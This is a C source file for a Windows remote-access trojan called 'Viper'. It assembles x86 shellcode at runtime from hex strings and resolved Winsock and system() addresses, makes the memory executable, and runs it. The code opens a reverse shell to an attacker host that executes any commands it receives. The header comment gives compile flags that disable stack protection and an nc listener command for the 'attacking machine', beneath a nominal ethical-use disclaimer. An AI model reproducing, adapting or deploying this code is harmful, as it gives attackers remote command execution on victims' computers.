/*
*	Name: Viper
*	Authored by: http://www.neehack.com/
*
*	This program is distributed for ethical purposes only.
*
*	Guide: This is a RAT based malware that connects to a remote system and allows remote code execution.
*	The malware is developed under windows 10 32bit architecture 
*	but is also compatible with 64bit, you just have to specify to your compiler that it is a 32bit code.
*	
*	To test it, you can:
* 	1. Compoile the code using gcc as following: `gcc -g -fno-stack-protector -m32 viper.c -o viper.exe -l ws2_32`
* 	2. Start a listener using Any/nc as following in your attacking machine: `nc -lnvp 80`
*	3. Execute viper in localhost(change IP bytes in the malware to connect to other attacking systems) `viper.exe`
*/

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <memoryapi.h>
#include <winbase.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

char buf[10000];

char con[10000];
void parseCstring(const char buf[], char con[]);
char getFuncAddress(char Address[]);

int main()
{
	char shp1[] =             "\\xff\\xd0\\x83\\xec\\x08\\x89\\x45\\xec\\x83\\x7d\\xec\\x00\\x74\\x1d\\x8b"
				  "\\x45\\xec\\x89\\x44\\x24\\x04\\xc7\\x04\\x24\\x24\\x40\\x40\\x00\\xe8\\xcc"
				  "\\x13\\x00\\x00\\xb8\\x01\\x00\\x00\\x00\\xe9\\xed\\x02\\x00\\x00\\xc7\\x45"
				  "\\xf4\\xff\\xff\\xff\\xff\\xc7\\x85\\x54\\xfe\\xff\\xff\\x00\\x00\\x00\\x00"
				  "\\xc7\\x45\\xf0\\x00\\x00\\x00\\x00\\xc7\\x44\\x24\\x08\\x20\\x00\\x00\\x00"
				  "\\xc7\\x44\\x24\\x04\\x00\\x00\\x00\\x00\\x8d\\x85\\x34\\xfe\\xff\\xff\\x89"
				  "\\x04\\x24\\xbf";
	char shp2[] =             "\\xFF\\xD7\\xc7\\x85\\x38\\xfe\\xff\\xff\\x00\\x00\\x00\\x00\\xc7\\x85\\x3c"
				  "\\xfe\\xff\\xff\\x01\\x00\\x00\\x00\\xc7\\x85\\x40\\xfe\\xff\\xff\\x06\\x00"
				  "\\x00\\x00";
	char shp3[] =             "\\xff\\xd0\\x83\\xec\\x10\\x89\\x45\\xec\\x83\\x7d\\xec\\x00\\x74\\x24\\x8b"
				  "\\x45\\xec\\x89\\x44\\x24\\x04\\xc7\\x04\\x24\\x48\\x40\\x40\\x00\\xe8\\xf4"
				  "\\x12\\x00\\x00\\xa1\\x2c\\x62\\x40\\x00\\xff\\xd0\\xb8\\x01\\x00\\x00\\x00"
				  "\\xe9\\x0e\\x02\\x00\\x00\\x8b\\x85\\x54\\xfe\\xff\\xff\\x89\\x45\\xf0\\xe9"
				  "\\xa7\\x00\\x00\\x00\\x8b\\x45\\xf0\\x8b\\x48\\x0c\\x8b\\x45\\xf0\\x8b\\x50"
				  "\\x08\\x8b\\x45\\xf0\\x8b\\x40\\x04\\x89\\x4c\\x24\\x08\\x89\\x54\\x24\\x04"
				  "\\x89\\x04\\x24\\xb8";
	char shp4[] =             "\\xff\\xd0\\x83\\xec\\x0c\\x89\\x45\\xf4\\x83\\x7d\\xf4\\xff\\x75\\x28\\xa1"
				  "\\x30\\x62\\x40\\x00\\xff\\xd0\\x89\\x44\\x24\\x04\\xc7\\x04\\x24\\x6c\\x40"
				  "\\x40\\x00\\xe8\\x8e\\x12\\x00\\x00\\xa1\\x2c\\x62\\x40\\x00\\xff\\xd0\\xb8"
				  "\\x01\\x00\\x00\\x00\\xe9\\xa8\\x01\\x00\\x00\\x90\\x8b\\x45\\xf0\\x90\\x8b"
				  "\\x40\\x10\\x90\\x89\\xc2\\x8b\\x45\\xf0\\x8b\\x40\\x18\\x89\\x54\\x24\\x08"
				  "\\x89\\x44\\x24\\x04\\x8b\\x45\\xf4\\x89\\x04\\x24\\xb8";
	char shp5[] =             "\\xff\\xd0\\x83\\xec\\x0c\\x89\\x45\\xec\\x83\\x7d\\xec\\xff\\x75\\x2c\\x8b"
				  "\\x45\\xf4\\x89\\x04\\x24\\xa1\\x38\\x62\\x40\\x00\\xff\\xd0\\x83\\xec\\x04"
				  "\\xc7\\x45\\xf4\\xff\\xff\\xff\\xff\\x8b\\x45\\xf0\\x8b\\x40\\x1c\\x89\\x45"
				  "\\xf0\\x83\\x7d\\xf0\\x00\\x0f\\x85\\x4f\\xff\\xff\\xff\\xeb\\x01\\x90\\x8b"
				  "\\x85\\x54\\xfe\\xff\\xff\\x89\\x04\\x24\\xb8";
	char shp6[] =             "\\xff\\xd0\\x83\\xec\\x04\\x83\\x7d\\xf4\\xff\\x75\\x1d\\xc7\\x04\\x24\\x8b"
				  "\\x40\\x40\\x00\\xe8\\xf4\\x11\\x00\\x00\\xa1\\x2c\\x62\\x40\\x00\\xff\\xd0"
				  "\\xb8\\x01\\x00\\x00\\x00\\xe9\\x16\\x01\\x00\\x00\\xc7\\x85\\x22\\xfe\\xff"
				  "\\xff\\x41\\x41\\x41\\x41\\xc6\\x85\\x26\\xfe\\xff\\xff\\x00\\x8d\\x85\\x22"
				  "\\xfe\\xff\\xff\\x89\\x04\\x24\\xbf";
	char shp7[] =             "\\xFF\\xD7\\xc7\\x44\\x24\\x0c\\x00\\x00\\x00\\x00\\x89\\x44\\x24\\x08\\x8d"
				  "\\x85\\x22\\xfe\\xff\\xff\\x89\\x44\\x24\\x04\\x8b\\x45\\xf4\\x89\\x04\\x24"
				  "\\xb8";
	char shp8[] =             "\\xff\\xd0\\x83\\xec\\x10\\x89\\x45\\xec\\x83\\x7d\\xec\\xff\\x75\\x38\\xa1"
				  "\\x30\\x62\\x40\\x00\\xff\\xd0\\x89\\x44\\x24\\x04\\xc7\\x04\\x24\\xa8\\x40"
				  "\\x40\\x00\\xe8\\x86\\x11\\x00\\x00\\x8b\\x45\\xf4\\x89\\x04\\x24\\xa1\\x38"
				  "\\x62\\x40\\x00\\xff\\xd0\\x83\\xec\\x04\\xa1\\x2c\\x62\\x40\\x00\\xff\\xd0"
				  "\\xb8\\x01\\x00\\x00\\x00\\xe9\\x90\\x00\\x00\\x00\\xc6\\x85\\x22\\xfa\\xff"
				  "\\xff\\x00\\xc7\\x44\\x24\\x0c\\x00\\x00\\x00\\x00\\xc7\\x44\\x24\\x08\\x00"
				  "\\x04\\x00\\x00\\x8d\\x85\\x22\\xfa\\xff\\xff\\x89\\x44\\x24\\x04\\x8b\\x45"
				  "\\xf4\\x89\\x04\\x24\\xb8";
	char shp9[] =             "\\xff\\xd0\\x83\\xec\\x10\\x89\\x45\\xe8\\x83\\x7d\\xe8\\xff\\x75\\x43\\xa1"
				  "\\x30\\x62\\x40\\x00\\xff\\xd0\\x89\\xc2\\xa1\\xd8\\x61\\x40\\x00\\x83\\xc0"
				  "\\x40\\x89\\x54\\x24\\x08\\xc7\\x44\\x24\\x04\\xc4\\x40\\x40\\x00\\x89\\x04"
				  "\\x24\\xe8\\x36\\x11\\x00\\x00\\x8b\\x45\\xf4\\x89\\x04\\x24\\xa1\\x38\\x62"
				  "\\x40\\x00\\xff\\xd0\\x83\\xec\\x04\\xa1\\x2c\\x62\\x40\\x00\\xff\\xd0\\xb8"
				  "\\xff\\xff\\xff\\xff\\xeb\\x13\\x8d\\x85\\x22\\xfa\\xff\\xff\\x89\\x04\\x24"
				  "\\xbf";
	char shp10[] =            "\\xFF\\xD7\\xe9\\x6e\\xff\\xff\\xff\\x8b\\x4d\\xfc\\xc9\\x8d\\x61\\xfc\\xc3";
	char iBytes[]=            "\\xc7\\x85\\x2a\\xfe\\xff\\xff\\x31\\x32\\x37\\x2e\\xc7\\x85\\x2e\\xfe\\xff"
				  "\\xff\\x30\\x2e\\x30\\x2e\\x66\\xc7\\x85\\x32\\xfe\\xff\\xff\\x32\\x00\\x66"
				  "\\xC7\\x85\\x27\\xFE\\xFF\\xFF\\x38\\x30\\xc6\\x85\\x29\\xfe\\xff\\xff\\x00"
				  "\\x8d\\x85\\x54\\xfe\\xff\\xff\\x89\\x44\\x24\\x0c\\x8d\\x85\\x34\\xfe\\xff"
				  "\\xff\\x89\\x44\\x24\\x08\\x8d\\x85\\x27\\xfe\\xff\\xff\\x89\\x44\\x24\\x04"
				  "\\x8d\\x85\\x2a\\xfe\\xff\\xff\\x89\\x04\\x24\\xb8";
	
	strcpy(buf,   "\\x89\\x44\\x24\\x04\\xc7\\x04\\x24\\x02\\x02\\x00\\x00\\xb8");
	char Address[30];
	WSADATA wsaData;
	sprintf(Address, "%p", WSAStartup);
	getFuncAddress(Address);
	printf("address of WSAStartup [%p:%s]\n", WSAStartup, Address);
	
	
	strcat(buf, Address);
	strcat(buf, shp1);
	
	
	sprintf(Address, "%p", memset);
	getFuncAddress(Address);
	
	
	strcat(buf, Address);
	strcat(buf, shp2);
	strcat(buf, iBytes);

	sprintf(Address, "%p", getaddrinfo);
	getFuncAddress(Address);
	strcat(buf, Address);
	strcat(buf, shp3);
	
	
	sprintf(Address, "%p", socket);
	getFuncAddress(Address);
	strcat(buf, Address);
	strcat(buf, shp4);
	
	
	sprintf(Address, "%p", connect);
	getFuncAddress(Address);
	strcat(buf, Address);
	strcat(buf, shp5);
	
	
	sprintf(Address, "%p", freeaddrinfo);
	getFuncAddress(Address);
	strcat(buf, Address);
	strcat(buf, shp6);
	
	
	sprintf(Address, "%p", strlen);
	getFuncAddress(Address);
	strcat(buf, Address);
	strcat(buf, shp7);
	

	sprintf(Address, "%p", send);
	getFuncAddress(Address);
	strcat(buf, Address);
	strcat(buf, shp8);
	

	sprintf(Address, "%p", recv);
	getFuncAddress(Address);
	strcat(buf, Address);
	strcat(buf, shp9);
	
	
	sprintf(Address, "%p", system);
	getFuncAddress(Address);
	strcat(buf, Address);
	strcat(buf, shp10);
	
	parseCstring(buf, con);
	
	DWORD oldprot;
	if ((VirtualProtect((int *)0x00403020,1,PAGE_EXECUTE_READWRITE,&oldprot) == FALSE) )
    {
        printf("our vprot failed\n");
        return FALSE;
    }
	((void(*)())con)();
	
	return 0;
}

char getFuncAddress(char Address[]){
	char p4[5] = "";
	char p3[5] = "";
	char p2[5] = "";
	char p1[5] = "";
	sprintf(p4, "\\x%c%c", Address[6], Address[7]);
	sprintf(p3, "\\x%c%c", Address[4], Address[5]);
	sprintf(p2, "\\x%c%c", Address[2], Address[3]);
	sprintf(p1, "\\x%c%c", Address[0], Address[1]);
	sprintf(Address, "%s%s%s%s", p4,p3,p2,p1);
	return Address;
}
void parseCstring(const char buf[], char con[])
{
    int i=0, j=0;
    unsigned char x;
    while ( (x = buf[i]) != '\0')
    {
        if ( (x=='\\') && (buf[i+1]=='x') && (isxdigit(buf[i+2])) && (isxdigit(buf[i+3])) )
        {
            unsigned int val;
            sscanf(&(buf[i+2]),"%2x", &val);
            x=(unsigned char)val;
            i+=3;
        }
        con[j++]=x;
        i++;
    }
	printf("%d\n", strlen(con));
}
